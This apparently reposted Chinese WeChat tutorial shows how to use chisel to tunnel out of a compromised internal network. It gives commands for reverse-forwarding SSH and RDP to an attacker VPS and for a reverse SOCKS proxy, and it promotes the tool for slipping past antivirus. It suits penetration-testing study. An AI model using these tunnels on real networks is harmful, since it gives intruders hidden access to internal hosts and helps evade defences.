> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/hwotRYU6PxpfFWkCGI4dGw)

**一、chisel 工具介绍**  

====================

Chisel 可用来搭建内网隧道，类似于常用的 frp 和 nps 之类的工具。由于目前使用的人比较少，因此对于有些杀软还不能准确的识别出该工具。chisel 可以进行端口转发、反向端口转发以及 Socks 流量代理，使用 go 语言编写，支持多个平台使用，是进行内网穿透的一个鲜为人知的好工具。

### **二、chisel 工具下载使用**

#### **0x01 chisel 工具下载**

```
下载地址：https://github.com/jpillora/chisel/releases/tag/v1.7.4
```

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8chGvkicq0tR7G9wXDS7Go1ct82zlx3GsruyicY05cUm8uelaUJHCHqfjONzicbrOPL2o3dQDEwpz9g/640?wx_fmt=png)

chisel 工具是使用 go 语言进行编写的，可以适用于各个平台，也可以对源码进行编译，或者直接使用编译好的发行版。

#### **0x02 chisel 工具使用**

首先，chisel 和 frp、nps 是不同的，没有所谓的服务器端和客户端，对于 chisel，只有一个文件，可以通过执行这个文件，让其充当服务器端或者客户端。如下所示:

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8chGvkicq0tR7G9wXDS7Go1K2dCZ29DFOv7svMXqtQC6UMiakyFwzvlrTibo1vzMkA6jOXZgGgCj0sQ/640?wx_fmt=png)

(1): 查看 chisel 工具的帮助

```
./chisel -help
```

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8chGvkicq0tR7G9wXDS7Go1srQAbGfOGAXLtIiaHAKctt8IsML3eF693iavNgjerNekb2n87tG5ibT4Q/640?wx_fmt=png)

(2): 查看 chisel 服务器端的帮助

```
./chisel server -help
```

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8chGvkicq0tR7G9wXDS7Go1bG0lalhO4huxb7G362zgsO6eCXLyJhPkxZY9oaVjJqCaZ7C7oWhLYA/640?wx_fmt=png)

(3): 查看 chisel 客户端的帮助

```
./chisel client -help
```

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8chGvkicq0tR7G9wXDS7Go1wuXwXNp1pj5Lc59hEcFVW1jsdFEMUUY19tYvuXiavFPnnOia3Nv2qbeQ/640?wx_fmt=png)

这块只是重点讲解一下如何查看帮助，接下来会去介绍如何在实战中使用 chisel 工具。

### **三、chisel 隧道搭建**

#### **0x01 chisel 进行 ssh 内网穿透**

首先需要三台 linux 主机，在这里使用 VPS 作为 chisel 服务器端，然后使用 kali 作为内网主机，使用另一台主机作为我们的攻击者主机。如下图所示。

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8chGvkicq0tR7G9wXDS7Go1anFZhhEicaeAhaSUrpyl4D8yBl1wQZCiaTGYHuae7gH0icAib3rWRPmcpg/640?wx_fmt=png)

(1): 第一步: 搭建 chisel 隧道

*   chisel 服务端 (CentOS 上)
    

```
./chisel server -p 6666 --reverse
```

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8chGvkicq0tR7G9wXDS7Go1icr9cgzUFlnG6nXg7480Vu27OSTFMN8haWiaTtMQibE9pNQGmWzOsu9ibg/640?wx_fmt=png)

首先，服务器端监听 6666 端口，然后使用 reverse 参数，reverse 表示的是服务端使用反向模式，也就是说流量转到哪个端口由客户端指定。

*   chisel 客户端 (kali 的 IP 为 192.168.223.160)
    

```
./chisel client -v VPS:6666 R:0.0.0.0:8888:192.168.223.160:22 
./chisel client -v VPS:6666 R:8888:192.168.223.160:22
```

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8chGvkicq0tR7G9wXDS7Go1Lo6XrrJ3SOAArn2bPHP1khiczy3q1pzIJzia21lykhvkicSdLwVZ1PDLA/640?wx_fmt=png)

客户端启动成功。

**说明: 可以使用第一条命令，也可以使用第二条命令，其实第二条命令和第一条命令效果一样，只是省略了 0.0.0.0，chisel 的客户端默认使用的就是 0.0.0.0 这个 IP。**

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8chGvkicq0tR7G9wXDS7Go1v46XGo8ug5ibOpRtNtabPxdeJnEjekpdfWZc2QxKEXgyVoj1C02qWzQ/640?wx_fmt=png)

(2): 第二步: 将 kali 的 22 端口转发到 VPS 的 8888 端口上

其实上一步已经完成了这一步操作，现在看一下 chisel 服务端和客户端的连接情况。

*   服务器端
    

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8chGvkicq0tR7G9wXDS7Go1HUyvMd1WZSyZktkJ37ozMIHvJIlE8WOsqFVcicpgUeTCbecgvBvNvDg/640?wx_fmt=png)

*   客户端
    

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8chGvkicq0tR7G9wXDS7Go1tW5fh69yCic8icN4Ex2tOQ7S9rcvYDhvGMZwMyaAyJasWaHTXyx4cmicw/640?wx_fmt=png)

SSH 已经连接。

(3): 第三步: 使用攻击者主机连接 kali 的 SSH

```
ssh -p 8888 root@VPS(chisel服务端IP)
```

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8chGvkicq0tR7G9wXDS7Go1Wt9ffnjudiavgnicrFsiccouEhOBMOibO6EyKwSDOonyU36Dxc6rWBuaCQ/640?wx_fmt=png)

#### **0x02 chisel 进行远程桌面代理**

首先需要两台 windows 主机和一台 VPS，在这里使用 VPS 作为 chisel 服务器端，然后使用 win7 作为内网主机，使用 win10 作为我们的攻击者主机。如下图所示。原理和 ssh 穿透类似。

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8chGvkicq0tR7G9wXDS7Go1tRYjWeDVz0uM4SulA16PpYPV4pLlOCdguEbxrnatBibjlUI1ppfW4XQ/640?wx_fmt=png)

(1): 第一步: 搭建 chisel 隧道

*   chisel 服务端 (CentOS 上)
    

```
./chisel server -p 6666 --reverse
```

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8chGvkicq0tR7G9wXDS7Go1mO4yE66PMhibVibHmKJsHCpueDD91CE8UBMf27HOgGojgDlbNJ2OTFxA/640?wx_fmt=png)

*   chisel 客户端 (win7 的 IP 为 192.168.223.151)
    

```
chisel.exe client -v VPS:6666 R:0.0.0.0:33389:192.168.223.151:3389
```

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8chGvkicq0tR7G9wXDS7Go1yo9PalVLQWWfZoDTA19I2O2qS6xUpJ3ycwibveCE30kweuaCZrwgQQg/640?wx_fmt=png)

(2): 第二步: 将 win7 的 3389 端口转发到 VPS 的 33389 端口

其实上一步已经完成了这一步操作，现在看一下 chisel 服务端和客户端的连接情况。

*   服务端
    

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8chGvkicq0tR7G9wXDS7Go1m8L2d1siaFmq2xxRFbsOsS1ftbIFRJ1ysFCVTbZMiayiaibHSBJpmIWoJA/640?wx_fmt=png)

*   客户端
    

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8chGvkicq0tR7G9wXDS7Go1QicA0pvLia221k6f1HpMAwFMVaeGTN2jR4mFtAhBwu0wAMGVQ9Rcvokw/640?wx_fmt=png)

(3): 第三步: 使用攻击者主机连接 win7 的 3389

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8chGvkicq0tR7G9wXDS7Go1OuyMaGoYhAmtn0fpWTmDKCNM4CBdJcchj4MDiaSwJhOdmxj71iaLT6vg/640?wx_fmt=png)

成功登录远程桌面。

#### **0x03 chisel 进行 socks 代理**

Chisel 现在支持 socks 代理，我们先看下需求，比如有两台主机，一台主机是我们的 VPS，有一个公网 IP，另一台主机是我们在内网中拿下的一台主机，我们需要在这台主机上配置 socks 代理，然后使用 SocksCap 等工具进行内网扫描或者内网渗透。如下图所示。

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8chGvkicq0tR7G9wXDS7Go1lgYFrCwvmdBsf8kUtph2kDZAZicaM7fIvuNkCuSVibbsYe2mvgFCxulQ/640?wx_fmt=png)

注意: 这个过程看似和之前的两种方法一样，但是这里面有一个最主要的问题就是，chisel 这个工具提供的 socks 代理默认是监听在 127.0.0.1 的 1080 端口上的。首先，需要先明确两个概念，127.0.0.1 和 0.0.0.0 者两个 IP 进行监听的区别是什么？127.0.0.1 监听的是本机上的所有流量，0.0.0.0 监听的是所有的 IP(不论是不是本机的 IP) 的流量。这就导致一个问题，如果我直接在 VPS 上执行完命令之后，默认监听 127.0.0.1 的 1080 端口，这样的话，我只能用 VPS 去访问内网主机，如果想要在 win10 上通过 SocksCap 设置代理访问内网是行不通的，因为刚才说过，这个 127.0.0.1 的 1080 端口只能使用 VPS 这台主机访问内网的 win7。因此，如果想要像之前一样使用 SocksCap 去代理访问内网，需要再多做一步，使用 ssh 的本地转发功能将 127.0.0.1 的 1080 上的 socks 流量转发到 0.0.0.0 的 23333 端口，这样我们就可以在外部通过 socks 流量实现对内网主机的访问。如果不进行 ssh 本地转发，那么就只能在 VPS 上设置 proxychains 代理这种方法对内网实现访问，这显然非常不方便。

(1): 第一步: 搭建 chisel 隧道

*   chisel 服务端 (CentOS 上)
    

```
./chisel server -p 6666 --reverse
```

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8chGvkicq0tR7G9wXDS7Go1DfQH1FJo2qdOBm7rmTpS937eIpJjJNVCyq1vdUrJPmz2hw9s3qdmOg/640?wx_fmt=png)

*   chisel 客户端 (win7 的 IP 为 192.168.223.151)
    

```
chisel.exe client VPS:6666 R:socks
```

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8chGvkicq0tR7G9wXDS7Go1hNS9mrjT1w7piaWHEjxSoLd54A6Gptzib2nib4ibOfNrdL92MMs4FtAAlg/640?wx_fmt=png)

(2): 将 127.0.0.1 的 1080 的流量转发到 0.0.0.0 的 23333 端口

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8chGvkicq0tR7G9wXDS7Go170de8sHPvibHGKbQGCPXc2l67Pb6lv7WCricic9hwADd61tvTSltcyZ8g/640?wx_fmt=png)

本地的 1080 端口已经监听成功。

在 VPS 上使用 ssh 进行本地流量转发:

```
ssh -C -f -N -g -L 0.0.0.0:23333:127.0.0.1:1080 root@VPS
```

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8chGvkicq0tR7G9wXDS7Go1GKicO2NntOchRYe3eEkacFrtVDAVoruAD0hDQWFcEmd4XN6rnf4spMA/640?wx_fmt=png)

成功将 127.0.0.1 的 1080 端口上的流量转发到 0.0.0.0 的 23333 端口上，这样就可以使用 socksCap 或者直接在浏览器中设置代理对内网资源进行访问。

(3): 使用 Socks 代理访问内网

*   使用浏览器
    

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8chGvkicq0tR7G9wXDS7Go1A9JnFibibPBWlicJJHsu2St4SnZkUaB8DEdMzdSlHmrHCPMkZnia1d6fTg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8chGvkicq0tR7G9wXDS7Go1o1mxsugUbfkEhsIl7LTOmyeZv33o4b8h8DYl1P2HVPCkb0MypjG66A/640?wx_fmt=png)

成功访问到内网的通达 OA。

*   使用 SocksCap 进行内网访问
    

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8chGvkicq0tR7G9wXDS7Go17vZLoQrZlzTsOorSH9nySx3qibPnpRbXQcs9twwbF0XYGdXsAW1pyog/640?wx_fmt=png)

代理搭建成功，流量可以正常进入内网。

### **四、chisel 的优劣点**

#### **优点：**

目前像 frp、nps 这种常见的工具已经很容易被杀软识别，上次打内网传的 frp 就很快被杀软识别，因此 chisel 可以作为一个不太常用的工具进行尝试，可能会因为目前特征较少，从而绕过杀软。

#### **缺点：**

个人觉得 chisel 进行 socks 流量代理的时候，可能会比较麻烦，因为需要进行本地端口转发，这样难免会多进行一步，但是我觉得这个也就是一条命令的事情，个人觉得影响不大。

![](https://mmbiz.qpic.cn/mmbiz/17MiccsGRV0D2LfqIJGaG0SdOrQ3Ebl0BZmSDrMLia8x0UgcCzQDzkNrSuo7FfOQUkMbYHVvNYDtbv4YicqvaQl6w/640?wx_fmt=png)

**「天億网络安全」 知识星球** 一个网络安全学习的星球！星球主要分享、整理、原创编辑等网络安全相关学习资料，一个真实有料的网络安全学习平台，大家共同学习、共同进步！

**知识星球定价：****199 元 / 年，****（服****务时间为一年，自加入日期顺延一年）。**

**如何加入：扫描下方二维码，扫码付费即可加入。**

**加入知识星球的同学，请加我微信，拉您进 VIP 交流群！**

![](https://mmbiz.qpic.cn/mmbiz_png/zojWxwXWulPwfeIwXehIT0QRFVlwF4icMIH7MQaS5F3pszdXc0a3SacoTOKHH6t5Tl2CfKbsMvDoeibiaVp1TJdFA/640?wx_fmt=png)

朋友都在看

  

[▶️](http://mp.weixin.qq.com/s?__biz=MzU4ODU1MzAyNg==&mid=2247492746&idx=1&sn=af1ffed40ca1a50a9f35f053144840f3&chksm=fdd9aaa7caae23b1ed5d0af7e891156f57815f626472e5d686e3e1b3c22c390ca62f82fca695&scene=21#wechat_redirect)[等保 2.0 丨 2021 必须了解的 40 个问题](http://mp.weixin.qq.com/s?__biz=MzU4ODU1MzAyNg==&mid=2247492746&idx=1&sn=af1ffed40ca1a50a9f35f053144840f3&chksm=fdd9aaa7caae23b1ed5d0af7e891156f57815f626472e5d686e3e1b3c22c390ca62f82fca695&scene=21#wechat_redirect)

[▶️](http://mp.weixin.qq.com/s?__biz=MzU4ODU1MzAyNg==&mid=2247492746&idx=1&sn=af1ffed40ca1a50a9f35f053144840f3&chksm=fdd9aaa7caae23b1ed5d0af7e891156f57815f626472e5d686e3e1b3c22c390ca62f82fca695&scene=21#wechat_redirect)[等保 2.0 三级 拓扑图 + 设备套餐 + 详解](http://mp.weixin.qq.com/s?__biz=MzU4ODU1MzAyNg==&mid=2247489449&idx=1&sn=a076604631a36da271995c9753f042f6&chksm=fdda5984caadd092cdb882402e0e97b4c9b673ef9e39777d33f9df3e153cf61a12cd2737ac34&scene=21#wechat_redirect)  

[▶️](http://mp.weixin.qq.com/s?__biz=MzU4ODU1MzAyNg==&mid=2247492746&idx=1&sn=af1ffed40ca1a50a9f35f053144840f3&chksm=fdd9aaa7caae23b1ed5d0af7e891156f57815f626472e5d686e3e1b3c22c390ca62f82fca695&scene=21#wechat_redirect)[等保 2.0 二级 拓扑图 + 设备套餐 + 详解](http://mp.weixin.qq.com/s?__biz=MzU4ODU1MzAyNg==&mid=2247489460&idx=1&sn=eab3cf955b1e0010421f675433734174&chksm=fdda5999caadd08f4881a5af9c024df6bf7b77b316a2bbc15b4ef4b62619d05f1b66b917af17&scene=21#wechat_redirect)  

[▶️](http://mp.weixin.qq.com/s?__biz=MzU4ODU1MzAyNg==&mid=2247492860&idx=1&sn=3af1f5269f100191d2963ce8979da3a1&chksm=fdd9aad1caae23c73f880bee906fabb200a1fda6d186cd16dbc844234d29da41caff5cf9c026&scene=21#wechat_redirect)[等保 2.0 测评  二级系统和三级系统多长时间测评一次？](http://mp.weixin.qq.com/s?__biz=MzU4ODU1MzAyNg==&mid=2247492860&idx=1&sn=3af1f5269f100191d2963ce8979da3a1&chksm=fdd9aad1caae23c73f880bee906fabb200a1fda6d186cd16dbc844234d29da41caff5cf9c026&scene=21#wechat_redirect)

[▶️](http://mp.weixin.qq.com/s?__biz=MzU4ODU1MzAyNg==&mid=2247492015&idx=1&sn=8e5e608b069740cc224798f04429eab7&chksm=fdd9af82caae26947f4a78daabbf06a63904cf5cb95025ae43064aeab886a10d38e4515153eb&scene=21#wechat_redirect)[等保 2.0 系列安全计算环境之数据完整性、保密性测评](http://mp.weixin.qq.com/s?__biz=MzU4ODU1MzAyNg==&mid=2247492015&idx=1&sn=8e5e608b069740cc224798f04429eab7&chksm=fdd9af82caae26947f4a78daabbf06a63904cf5cb95025ae43064aeab886a10d38e4515153eb&scene=21#wechat_redirect)

[▶️](http://mp.weixin.qq.com/s?__biz=MzU4ODU1MzAyNg==&mid=2247487576&idx=1&sn=5e6416bec0c3ea2e3f8023a5b2f61c48&chksm=fdda5e75caadd763a0cadb5f408f90e884fdd72e793740fce15540ac34ca7978b2340f868e07&scene=21#wechat_redirect)[等保医疗 | 全国二级、三乙、三甲医院信息系统安全防护设备汇总](http://mp.weixin.qq.com/s?__biz=MzU4ODU1MzAyNg==&mid=2247487576&idx=1&sn=5e6416bec0c3ea2e3f8023a5b2f61c48&chksm=fdda5e75caadd763a0cadb5f408f90e884fdd72e793740fce15540ac34ca7978b2340f868e07&scene=21#wechat_redirect)

[▶️](http://mp.weixin.qq.com/s?__biz=MzU4ODU1MzAyNg==&mid=2247492015&idx=1&sn=8e5e608b069740cc224798f04429eab7&chksm=fdd9af82caae26947f4a78daabbf06a63904cf5cb95025ae43064aeab886a10d38e4515153eb&scene=21#wechat_redirect)[国务院：不符合网络安全要求的政务信息系统未来将不给经费](http://mp.weixin.qq.com/s?__biz=MzU4ODU1MzAyNg==&mid=2247490959&idx=1&sn=95cbc3781202bf2b7c8a9ab1de01e6f2&chksm=fdda53a2caaddab4daf54fc57e0849df1c0766bd6a9ab69e6a2565a7c494394037ad84c319a3&scene=21#wechat_redirect)

[▶️](http://mp.weixin.qq.com/s?__biz=MzU4ODU1MzAyNg==&mid=2247492015&idx=1&sn=8e5e608b069740cc224798f04429eab7&chksm=fdd9af82caae26947f4a78daabbf06a63904cf5cb95025ae43064aeab886a10d38e4515153eb&scene=21#wechat_redirect)[等级保护、风险评估和安全测评三者的区别](http://mp.weixin.qq.com/s?__biz=MzU4ODU1MzAyNg==&mid=2247490921&idx=1&sn=5f8f286ae5aae5b6e72af53729987d5e&chksm=fdda5344caadda5230a4eb351775d58636d331205c67151d17741fddf83d7a7931cbc98d70e8&scene=21#wechat_redirect)  

[▶️](http://mp.weixin.qq.com/s?__biz=MzU4ODU1MzAyNg==&mid=2247490647&idx=1&sn=e5a7abf9aad6299c2953a033f7a8a3cf&chksm=fdda527acaaddb6c760bd90c13b1703b687434f5b6451121e158391ea685ae071f306293333c&scene=21#wechat_redirect)[分保、等保、关保、密码应用对比详解](http://mp.weixin.qq.com/s?__biz=MzU4ODU1MzAyNg==&mid=2247490647&idx=1&sn=e5a7abf9aad6299c2953a033f7a8a3cf&chksm=fdda527acaaddb6c760bd90c13b1703b687434f5b6451121e158391ea685ae071f306293333c&scene=21#wechat_redirect)

[▶️](http://mp.weixin.qq.com/s?__biz=MzU4ODU1MzAyNg==&mid=2247493042&idx=1&sn=9df996f1b76b00626670b944cdd92990&chksm=fdd9ab9fcaae228908626f3435cc6445c3348b012bd20356bcbf676e74c131798d7c22c195dc&scene=21#wechat_redirect)[汇总 | 2020 年发布的最重要网络安全标准（下载）](http://mp.weixin.qq.com/s?__biz=MzU4ODU1MzAyNg==&mid=2247493042&idx=1&sn=9df996f1b76b00626670b944cdd92990&chksm=fdd9ab9fcaae228908626f3435cc6445c3348b012bd20356bcbf676e74c131798d7c22c195dc&scene=21#wechat_redirect)

> **天億网络安全**

**【欢迎收藏分享到朋友圈，让更多朋友了解网络安全，分享也是一种美德！】**

![](https://mmbiz.qpic.cn/mmbiz_jpg/zojWxwXWulPwfeIwXehIT0QRFVlwF4icMRHeiaWDziaJsbwJQbzz8GibVdAX8yogZwknkkF1YAzwJAYXhwQjFiaG1yA/640?wx_fmt=jpeg)

↑↑↑**长按**图片**识别二维码**关註↑↑↑

****欢迎扫描关注【天億网络安全】公众号，及时了解更多网络安全知识****
